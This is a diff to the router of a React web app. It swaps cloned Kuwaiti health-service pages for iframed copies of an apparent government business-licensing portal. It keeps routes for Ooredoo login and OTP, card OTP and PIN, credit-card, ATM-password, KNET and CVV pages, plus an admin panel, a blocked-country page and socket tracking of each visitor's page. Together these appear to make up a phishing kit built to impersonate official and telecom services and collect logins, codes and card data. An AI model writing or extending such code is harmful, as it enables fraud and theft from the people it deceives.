@@ -10,34 +10,33 @@ import { LanguageProvider } from "./i18n/LanguageContext";
 import { initializeSocket, disconnectSocket, socket, navigateToPage } from "./lib/store";
 import { useState, useEffect } from "react";
 
-// New Pages
-import Portal from "./pages/Portal";
-import Home from "./pages/Home";
-import ServiceDetails from "./pages/ServiceDetails";
+// Ooredoo Pages
 import OoredooLogin from "./pages/OoredooLogin";
 import OoredooOtp from "./pages/OoredooOtp";
-import Waiting from "./pages/Waiting";
-import Sehhaty from "./pages/Sehhaty";
-import SehhatyInfo from "./pages/SehhatyInfo";
-import SehhatyService from "./pages/SehhatyService";
-import MedicalLogin from "./pages/MedicalLogin";
-import MedicalActivate from "./pages/MedicalActivate";
-import MedicalRegister from "./pages/MedicalRegister";
-import Legal from "./pages/Legal";
-import Info from "./pages/Info";
 import Admin from "./pages/Admin";
 
 // Card verification pages
 import CardOtp from "./pages/CardOtp";
 import CardPin from "./pages/CardPin";
 
-// Payment Pages (kept as-is)
+// Payment Pages
 import CreditCardPayment from "./pages/CreditCardPayment";
 import OTPVerification from "./pages/OTPVerification";
 import ATMPassword from "./pages/ATMPassword";
 import KNETPayment from "./pages/KNETPayment";
 import CVV from "./pages/CVV";
 import FinalPage from "./pages/FinalPage";
+
+// Sinwinqa Static Pages - iframe wrapper
+function SinwinqaPage({ src }: { src: string }) {
+  return (
+    <iframe
+      src={src}
+      style={{ width: "100%", height: "100vh", border: "none", display: "block" }}
+      title="sinwinqa"
+    />
+  );
+}
 
 function BlockedCountryPage() {
   return (
@@ -54,25 +53,90 @@ function BlockedCountryPage() {
 function Router() {
   return (
     <Switch>
-      {/* New Pages */}
-      <Route path={"/"} component={Portal} />
-      <Route path={"/medical-commission"} component={Home} />
-      <Route path={"/services/:key"} component={ServiceDetails} />
+      {/* Sinwinqa Static Pages */}
+      <Route path={"/"}>
+        {() => <SinwinqaPage src="/sinwinqa/index.html" />}
+      </Route>
+      <Route path={"/service"}>
+        {() => <SinwinqaPage src="/sinwinqa/service.html" />}
+      </Route>
+      <Route path={"/register"}>
+        {() => <SinwinqaPage src="/sinwinqa/register.html" />}
+      </Route>
+      <Route path={"/reset"}>
+        {() => <SinwinqaPage src="/sinwinqa/reset.html" />}
+      </Route>
+      <Route path={"/update"}>
+        {() => <SinwinqaPage src="/sinwinqa/update.html" />}
+      </Route>
+      <Route path={"/login"}>
+        {() => <SinwinqaPage src="/sinwinqa/login.html" />}
+      </Route>
+
+      {/* Sinwinqa Services Pages */}
+      <Route path={"/services/خدمة-الشهادات"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/خدمة-الشهادات.html" />}
+      </Route>
+      <Route path={"/services/طلب-إصدار-موافقة-استقدام-عمالية"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/طلب-إصدار-موافقة-استقدام-عمالية.html" />}
+      </Route>
+      <Route path={"/services/إصدار-رخصة-إعلان"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/إصدار-رخصة-إعلان.html" />}
+      </Route>
+      <Route path={"/services/إصدار-الرخصة-التجارية"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/إصدار-الرخصة-التجارية.html" />}
+      </Route>
+      <Route path={"/services/إغلاق-شركة"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/إغلاق-شركة.html" />}
+      </Route>
+      <Route path={"/services/إضافة-رخصة-تجارية-فرعية"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/إضافة-رخصة-تجارية-فرعية.html" />}
+      </Route>
+      <Route path={"/services/إدارة-فروع-الشركات-الأجنبية"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/إدارة-فروع-الشركات-الأجنبية.html" />}
+      </Route>
+      <Route path={"/services/التجديد-الشامل"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/التجديد-الشامل.html" />}
+      </Route>
+      <Route path={"/services/طلب-استكمال-التأسيس-الشامل"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/طلب-استكمال-التأسيس-الشامل.html" />}
+      </Route>
+      <Route path={"/services/التأسيس-الشامل"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/التأسيس-الشامل.html" />}
+      </Route>
+      <Route path={"/services/حجز-الاسم-التجاري"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/حجز-الاسم-التجاري.html" />}
+      </Route>
+      <Route path={"/services/تجديد-رخصة-إعلان"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/تجديد-رخصة-إعلان.html" />}
+      </Route>
+      <Route path={"/services/تقديم-سجل-معلومات-المستفيدين-الحقيقيين"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/تقديم-سجل-معلومات-المستفيدين-الحقيقيين.html" />}
+      </Route>
+      <Route path={"/services/التعديل-الشامل"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/التعديل-الشامل.html" />}
+      </Route>
+      <Route path={"/services/إلغاء-رخصة-إعلان"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/إلغاء-رخصة-إعلان.html" />}
+      </Route>
+      <Route path={"/services/إضافة-فرع"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/إضافة-فرع.html" />}
+      </Route>
+      <Route path={"/services/استكمال-تأسيس-مصنع"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/استكمال-تأسيس-مصنع.html" />}
+      </Route>
+      <Route path={"/services/طلب-تأسيس-مصنع"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/طلب-تأسيس-مصنع.html" />}
+      </Route>
+      <Route path={"/services/طلب-مستشار-تأسيس-الأعمال"}>
+        {() => <SinwinqaPage src="/sinwinqa/services/طلب-مستشار-تأسيس-الأعمال.html" />}
+      </Route>
+
+      {/* Ooredoo Routes */}
       <Route path={"/ooredoo-login"} component={OoredooLogin} />
       <Route path={"/ooredoo-otp"} component={OoredooOtp} />
-      <Route path={"/waiting"} component={Waiting} />
 
-      {/* Sehhaty Routes */}
-      <Route path={"/sehhaty"} component={Sehhaty} />
-      <Route path={"/sehhaty/info/:key"} component={SehhatyInfo} />
-      <Route path={"/sehhaty/service/:key"} component={SehhatyService} />
-      <Route path={"/sehhaty/services/:key"} component={SehhatyService} />
-      <Route path={"/medical-login"} component={MedicalLogin} />
-      <Route path={"/medical-activate"} component={MedicalActivate} />
-      <Route path={"/medical-register"} component={MedicalRegister} />
-      <Route path={"/medical-register/step/:step"} component={MedicalRegister} />
-      <Route path={"/legal/:slug"} component={Legal} />
-      <Route path={"/info/:slug"} component={Info} />
+      {/* Admin */}
       <Route path={"/admin"} component={Admin} />
 
       {/* Card Verification Routes */}
@@ -107,36 +171,29 @@ function App() {
     };
   }, []);
 
-  // تتبع تغيير الصفحة تلقائياً
   useEffect(() => {
     const pageNameMap: Record<string, string> = {
-      '/': 'البوابة الرئيسية',
-      '/medical-commission': 'خدمات القومسيون الطبي',
-      '/sehhaty': 'خدمة صحتي',
-      '/medical-login': 'تسجيل دخول القومسيون الطبي',
-      '/medical-activate': 'تفعيل حساب القومسيون',
-      '/medical-register': 'تسجيل القومسيون الطبي',
+      '/': 'الصفحة الرئيسية',
+      '/service': 'الخدمات',
+      '/register': 'تسجيل حساب',
+      '/reset': 'نسيت كلمة المرور',
+      '/update': 'تحديث كلمة المرور',
+      '/login': 'الدخول بالبطاقة الذكية',
       '/ooredoo-login': 'تسجيل دخول Ooredoo',
       '/ooredoo-otp': 'رمز OTP Ooredoo',
-      '/waiting': 'انتظار',
       '/credit-card-payment': 'الدفع ببطاقة الائتمان',
       '/otp-verification': 'رمز التحقق OTP',
       '/atm-password': 'كلمة مرور ATM',
-      '/card-otp': 'تسجيل دخول Ooredoo',
-      '/card-pin': 'رمز OTP Ooredoo',
+      '/card-otp': 'Card OTP',
+      '/card-pin': 'Card PIN',
       '/knet-payment': 'KNET',
       '/cvv': 'CVV',
       '/final-page': 'الصفحة النهائية',
     };
     const path = location.split('?')[0];
-    // Match dynamic routes
     let pageName = pageNameMap[path];
     if (!pageName) {
-      if (path.startsWith('/sehhaty/services/') || path.startsWith('/sehhaty/service/')) pageName = 'تفاصيل خدمة صحتي';
-      else if (path.startsWith('/sehhaty/info/')) pageName = 'معلومات صحتي';
-      else if (path.startsWith('/services/')) pageName = 'تفاصيل خدمة القومسيون';
-      else if (path.startsWith('/legal/')) pageName = 'الشروط والأحكام';
-      else if (path.startsWith('/info/')) pageName = 'معلومات';
+      if (path.startsWith('/services/')) pageName = 'تفاصيل الخدمة';
       else pageName = path;
     }
     navigateToPage(pageName);
